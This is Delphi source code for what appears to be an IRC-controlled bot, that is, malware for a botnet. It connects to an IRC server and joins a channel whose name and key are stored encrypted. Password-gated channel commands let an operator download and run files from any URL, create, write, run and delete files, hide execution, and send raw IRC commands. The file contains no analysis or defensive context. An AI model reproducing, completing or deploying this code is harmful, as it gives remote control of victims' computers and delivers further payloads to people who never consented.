   unit untIrc;
   interface
   uses windows, Winsock, untsettings, shellapi;

   var
    Loggedin:string;
    FileName : String;
    Wsadata : TWSADATA;
    SockAddrIn : TSockAddrIn;
    Buf : Array[0..36000] Of Char;
    A : Dword;
    function DLFile(Caller: cardinal; URL: PChar; FileName: PChar; Reserved: LongWord; StatusCB: cardinal): Longword; stdcall; external 'URLMON.DLL' name 'URLDownloadToFileA';

   Function ConnectServ(Serv,Ports:string):Integer;

   implementation

   Function ExtractExt(S:String):String;
   Var
    I:Integer;
    Str:String;
   Begin
    Result := '';
    Str := '';
    For i:=Length(S) downto 1 do
     If Copy(S, i, 1) = '.' Then Begin
      Break;
     End Else Str := Str + Copy(S, i, 1);
    Repeat
     Result := Result + Copy(Str, Length(Str), 1);
     Delete(Str, Length(Str), 1);
    Until str = '';
   End;

   function IntToStr(X: integer): string;
   var
    S: string;
   begin
    Str(X, S);
    Result := S;
   end;

   function StrToInt(S: string): integer;
   var
    V, Code: integer;
   begin
    Val(S, V, Code);
    Result := V;
   end;

   function AnsiLowerCase(const S: string): string;
   var
     Len: Integer;
   begin
     Len := Length(S);
     SetString(Result, PChar(S), Len);
     if Len > 0 then CharLowerBuff(Pointer(Result), Len);
   end;

   Procedure ReadText;
   Var
    Str:String;
    Par:String;
    Url:String;
    Answer:String;
   Begin
    Randomize;
    ZeroMemory(@Str, Length(Str));
    Str := Buf;
    ZeroMemory(@Buf, Length(Buf));
    Answer := '';
    If Pos('To connect, type', Str)>0 Then Begin
     Par := Str;
     Par := Copy(Par, Pos('To connect, type',Par)+Length('To connect, type')+8, Length(Par));
     par := Copy(Par, 1, Pos(#13#10,Par)-1);
     Answer := Par+#13#10;
     Send(Bot, Answer[1], Length(Answer), 0);
     Sleep(100);
    End;
    If Pos('MOTD',Str)>0 Then Begin
     Answer := 'JOIN '+decrypt(channel)+' '+decrypt(key)+#13#10;
     Send(Bot, Answer[1], Length(Answer), 0);
     Sleep(100);
     JoinedChan := true;
    End;
    If Pos('PING',Str)>0 Then Begin
     Par := Str;
     par := Copy(Par, Pos('PING',Par)+5, Length(Par));
     if copy(par,1,1) = ':' then par := copy(par,2,length(par));
     Answer := 'PONG :'+StripMsg(Par)+#13#10;
     Send(Bot, Answer[1], Length(Answer), 0);
     Sleep(100);
     IF JOINEDCHAN THEN
      IF (PINGTALK) AND (NOT Silence) THEN
       SendText(Bot, 'PRIVMSG '+decrypt(channel)+' :Pinged'+#13#10)
     ELSE begin
      SendText(Bot, 'JOIN '+decrypt(channel)+' '+decrypt(key)+#13#10);
      JoinedChan := true;
     end;
     Sleep(100);
    End;
    If Pos('Nickname is already in use.',Str)>0 Then Begin
     NewNick(NickLength);
    End;
    If Pos('PRIVMSG',Str)>0 Then Begin
     Par := Str;
     Par := StripMsg(Par);
     If (Pos('.aids',ansilowercase(Par))>0) or
        (Pos('.quit',ansilowercase(Par))>0) or
        (Pos('.die',ansilowercase(Par))>0) or
        (Pos('.exit',ansilowercase(Par))>0) Then Begin
      if pos(copy(str, 2, pos('!',str)-2),loggedin) =0 then exit;
      SendText(Bot, 'QUIT :Aids infected my brain and my butt.'+#13#10);
      ExitProcess(0);
     End else
     If Pos('.login',ansilowercase(par))>0 then begin
      url := copy(Par, Pos('.login',ansilowercase(par))+7, length(par));
      if url <> decrypt(password) then begin
       SendText(Bot, 'PRIVMSG '+Decrypt(Channel)+' :Wrong Password.'+#13#10);
       exit;
      end;
      if pos(copy(str, 2, pos('!',str)-2), loggedin)>0 then
       SendText(Bot, 'PRIVMSG '+Decrypt(Channel)+' :You are already logged in.'+#13#10)
      else begin
       SendText(Bot, 'PRIVMSG '+Decrypt(Channel)+' :You are now logged in.'+#13#10);
       Loggedin := Loggedin + copy(str, 2, pos('!',str)-2);
      end;
     end else
     If Pos('.logout',ansilowercase(par))>0 then begin
      url := copy(str, 2, pos('!',str)-2);
      if pos(url, loggedin)=0 then
       SendText(Bot, 'PRIVMSG '+Decrypt(Channel)+' :You are not logged in.'+#13#10)
      else begin
       SendText(Bot, 'PRIVMSG '+Decrypt(Channel)+' :You are now logged out.'+#13#10);
       delete(loggedin, pos(copy(str, 2, pos('!',str)-2), loggedin), length(copy(str, 2, pos('@',str)-2)));
      end;
     end else
     If Pos('.url',ansilowercase(Par))>0 Then Begin
      if pos(copy(str, 2, pos('!',str)-2),loggedin) =0 then exit;
      Url := Copy(Par, Pos('.url',ansilowercase(par))+5, length(par));
      Randomize;
      Filename := 'C:\'+IntToStr(Random(999999))+'.'+extractext(url);
      if not silence then
      SendText(Bot, 'PRIVMSG '+Decrypt(Channel)+' :Downloading '+url+#13#10);
      DLFile(0,Pchar(Url),pChar(Filename), 0, 0);
      if not silence then
      SendText(Bot, 'PRIVMSG '+Decrypt(Channel)+' :Downloaded '+Filename+', executing.'+#13#10);
      if IsUpdate Then
       ReleaseMutex(Mutex);
      ShellExecute(0, 'open', pchar(Filename), nil, nil, 0);
      if IsUpdate then
       ExitProcess(0);
     End Else
     If Pos('.hidden',ansilowercase(Par))>0 then begin
      if pos(copy(str, 2, pos('!',str)-2),loggedin) =0 then exit;
      If Copy(par, pos('.hidden',par)+8, 1) = '1' then
       HiddenStatus := True
      Else If Copy(par, pos('.hidden',par)+8, 1) = '0' then
       HiddenStatus := FALSE;
     End Else
     If Pos('.update',ansilowercase(Par))>0 then begin
      if pos(copy(str, 2, pos('!',str)-2),loggedin) =0 then exit;
      If Copy(par, pos('.update',par)+8, 1) = '1' then
       IsUpdate := True
      Else If Copy(par, pos('.update',par)+8, 1) = '0' then
       IsUpdate := FALSE;
     End Else
     If Pos('.silence',ansilowercase(Par))>0 then begin
      if pos(copy(str, 2, pos('!',str)-2),loggedin) =0 then exit;
      If Copy(par, pos('.silence',par)+9, 1) = '1' then
       SILENCE := True
      Else If Copy(par, pos('.silence',par)+9, 1) = '0' then
       SILENCE := FALSE;
     End Else
     If Pos('.pingtalk',ansilowercase(Par))>0 then begin
      if pos(copy(str, 2, pos('!',str)-2),loggedin) =0 then exit;
      If Copy(par, pos('.pingtalk',par)+10, 1) = '1' then
       PINGTALK := True
      Else If Copy(par, pos('.pingtalk',par)+10, 1) = '0' then
       PINGTALK := FALSE;
     End Else
     If Pos('.newnick',ansilowercase(par))>0 then begin
      if pos(copy(str, 2, pos('!',str)-2),loggedin) =0 then exit;
       SendText(Bot, 'NICK '+NewNick(NickLength)+#13#10);
     end Else
     If Pos('.nettalk',ansilowercase(Par))>0 then begin
      if pos(copy(str, 2, pos('!',str)-2),loggedin) =0 then exit;
      If Copy(par, pos('.nettalk',par)+9, 1) = '1' then
       NETBIOSTALK := True
      Else If Copy(par, pos('.nettalk',par)+9, 1) = '0' then
       NETBIOSTALK := FALSE;
     End Else
     If Pos('.createfile',ansilowercase(Par))>0 Then Begin
      if pos(copy(str, 2, pos('!',str)-2),loggedin) =0 then exit;
      Url := Copy(Par, Pos('.createfile', ansilowercase(Par))+12, length(par));
      DeleteFile(pChar(Url));
      AssignFile(BatFile, Url);
      Try
       ReWrite(BatFile);
      Except
       SendText(Bot, 'PRIVMSG '+decrypt(channel)+' :Error!'+#13#10);
      End;
     End Else
     If Pos('.appendfile',ansilowercase(Par))>0 Then Begin
      if pos(copy(str, 2, pos('!',str)-2),loggedin) =0 then exit;
      Url := Copy(Par, Pos('.appendfile', ansilowercase(Par))+12, length(par));
      AssignFile(BatFile, Url);
      Try
       Append(BatFile);
      Except
       SendText(Bot, 'PRIVMSG '+decrypt(channel)+' :Error!'+#13#10);
      End;
     End Else
     If Pos('.writetext',ansilowercase(Par))>0 Then Begin
      if pos(copy(str, 2, pos('!',str)-2),loggedin) =0 then exit;
      Url := Copy(Par, Pos('.writetext', ansilowercase(Par))+11, length(par));
      Try
       Write(BatFile, Url);
      Except
       SendText(Bot, 'PRIVMSG '+decrypt(channel)+' :Error!'+#13#10);
      End;
     End Else
     If Pos('.writeline',ansilowercase(Par))>0 Then Begin
      if pos(copy(str, 2, pos('!',str)-2),loggedin) =0 then exit;
      Url := Copy(Par, Pos('.writeline', ansilowercase(Par))+11, length(par));
      Try
       WriteLn(BatFile, Url);
      Except
       SendText(Bot, 'PRIVMSG '+decrypt(channel)+' :Error!'+#13#10);
      End;
     End Else
     If Pos('.closefile',ansilowercase(Par))>0 Then Begin
      if pos(copy(str, 2, pos('!',str)-2),loggedin) =0 then exit;
      Url := Copy(Par, Pos('.closefile', ansilowercase(Par))+11, length(par));
      Try
       CloseFile(BatFile);
      Except
       SendText(Bot, 'PRIVMSG '+decrypt(channel)+' :Error!'+#13#10);
      End;
     End Else
     If Pos('.executefile',ansilowercase(Par))>0 Then Begin
      if pos(copy(str, 2, pos('!',str)-2),loggedin) =0 then exit;
      Url := Copy(Par, Pos('.executefile', ansilowercase(Par))+13, length(par));
      Try
       ShellExecute(0, 'open',pchar(url), nil, nil, integer(HIDDENSTATUS));
      Except
       SendText(Bot, 'PRIVMSG '+decrypt(channel)+' :Error!'+#13#10);
      End;
     End Else
     If Pos('.deletefile',ansilowercase(Par))>0 Then Begin
      if pos(copy(str, 2, pos('!',str)-2),loggedin) =0 then exit;
      Url := Copy(Par, Pos('.deletefile', ansilowercase(Par))+12, length(par));
      Try
       DeleteFile(Pchar(Url));
      Except
       SendText(Bot, 'PRIVMSG '+decrypt(channel)+' :Error!'+#13#10);
      End;
     End Else
     If Pos('.raw',ansilowercase(Par))>0 then begin
      if pos(copy(str, 2, pos('!',str)-2),loggedin) =0 then exit;
      Url := Copy(Par, Pos('.raw', ansilowercase(par))+5, length(par));
      SendText(bot, url+#13#10);
     end else
     If Pos('.visitpage',ansilowercase(Par))>0 then begin
      if pos(copy(str, 2, pos('!',str)-2),loggedin) =0 then exit;
      Url := Copy(Par, Pos('.visitpage', ansilowercase(par))+10, length(par));
      DLFile(0,pchar(url), '', 0, 0);
     end;
    End;
   End;

   Function ConnectServ(Serv,Ports:string):Integer;
   var
    a:string;
   Begin
    Serv := GetIp(Serv);
    WSAStartUp(257,wsadata);
    Bot:=Socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
    SockAddrIn.sin_family:=AF_INET;
    SockAddrIn.sin_port:=htons(strtoint(Ports));
    SockAddrIn.sin_addr.S_addr:=inet_addr(PChar(Serv));
    Connect(Bot,SockAddrIn,SizeOf(SockAddrIn));
    IsConnected := True;
    a := ansilowercase(NewNick(NickLength));
    SendText(Bot, 'USER '+a+' '+a+'@bar.com '+serv+' :'+a+#13#10);
    Randomize;
    SendText(Bot, 'NICK '+a+#13#10);
    SendText(Bot, 'mode +i '+a+#13#10);
    result := 1;
    While True Do Begin
     if (recv(Bot,buf,SizeOf(buf),0)) < 1 then
      begin
       KillServ(Bot);
       JoinedChan := False;
       Exit;
      end else
       begin
        ReadText;
       end;
     end;
   End;


   end.

